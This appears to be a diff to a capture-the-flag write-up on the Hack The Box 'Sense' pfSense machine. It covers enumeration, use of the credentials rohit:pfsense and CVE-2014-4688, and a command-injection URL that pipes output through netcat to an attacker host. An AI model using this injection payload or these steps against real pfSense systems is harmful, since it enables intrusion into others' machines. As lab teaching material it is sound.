@@ -9,12 +9,14 @@
 **2. ./nmapAutomator.sh 10.10.10.60 All**
 
  cpe:/a:lighttpd:lighttpd:1.4.35: 
-|       CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052
-|_      CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052
+
+CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052
+CVE-2018-19052  5.0     https://vulners.com/cve/CVE-2018-19052
 
 **3. Dirb/Gobuster Enumeration**
 
-dirb https://10.10.10.60 -X .php,.html
+**dirb https://10.10.10.60 -X .php,.html**
+
 ---- Scanning URL: https://10.10.10.60/ ----
 + https://10.10.10.60/edit.php (CODE:200|SIZE:6689)                                                                                                                                                                                       
 + https://10.10.10.60/exec.php (CODE:200|SIZE:6689)                                                                                                                                                                                       
@@ -41,12 +43,12 @@ dirb https://10.10.10.60 -X .php,.html
 
 **4. SEARCHPLOIT**
 
-searchploit lightttpd
+**searchploit lighttpd**
 
 ![se5](https://user-images.githubusercontent.com/15195048/94268621-4d430500-fef2-11ea-86e5-a99b379dd30d.png)
 
 
-searchploit pfsense
+**searchploit pfsense**
 
 ![se6](https://user-images.githubusercontent.com/15195048/94268622-4d430500-fef2-11ea-8f14-9803af973efe.png)
 
@@ -77,9 +79,11 @@ https://10.10.10.60/tree/
 
 ![se10](https://user-images.githubusercontent.com/15195048/94268633-4fa55f00-fef2-11ea-878c-593a0be9a053.png)
 
-SilverStripe v 0.1
+**SilverStripe v 0.1**
+
 Searching for known vulnerabilities.
--Nothing interesting
+
+Nothing interesting
 
 changelog.txt
 
@@ -99,17 +103,14 @@ Credentials rohit:pfsense
 
 **Pfsense v2.1.3**
 
-
 ![se14](https://user-images.githubusercontent.com/15195048/94268639-50d68c00-fef2-11ea-911c-4785223aae8a.png)
 
+Searching for vulnerability I found **CVE-2014-4688**.
 
-
-Searching for vulnerability I found CVE-2014-4688.
 ![se15](https://user-images.githubusercontent.com/15195048/94268640-50d68c00-fef2-11ea-9a01-104f3842c192.png)
 
-
-
 **Modifications:** lhost, lport, rhost, username, password and start a netcat listener
+
 ![se16](https://user-images.githubusercontent.com/15195048/94268643-516f2280-fef2-11ea-9859-9d63edd558b8.png)
 
 
@@ -118,24 +119,25 @@ nc -lvp 9999
 
 ![se17](https://user-images.githubusercontent.com/15195048/94268644-516f2280-fef2-11ea-9de1-85702c0b0a6c.png)
 
-
 user.txt
 
-------------------------------------------------------------------------------------------------------------------------------------------------------
 # Privilege Escalation
+
 ## Command Injection Manually
+
 Study the article https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection
 
-/status_rrd_graph_img.php?database=queues;echo Testing | nc 10.10.14.12 443
+**/status_rrd_graph_img.php?database=queues;echo Testing | nc 10.10.14.12 443**
+
 **Attacker:**
 nc -nlvp 443
  
 
 We are local admin!
 No privilege escalation needed!
+
 ![se18](https://user-images.githubusercontent.com/15195048/94268646-5207b900-fef2-11ea-9eb3-6bdb03fe59fe.png)
 
 **Rooted**
-cat root.txt
-d08c32a5d4f8c8b10e76eb51a69f1a86
+root.txt
 
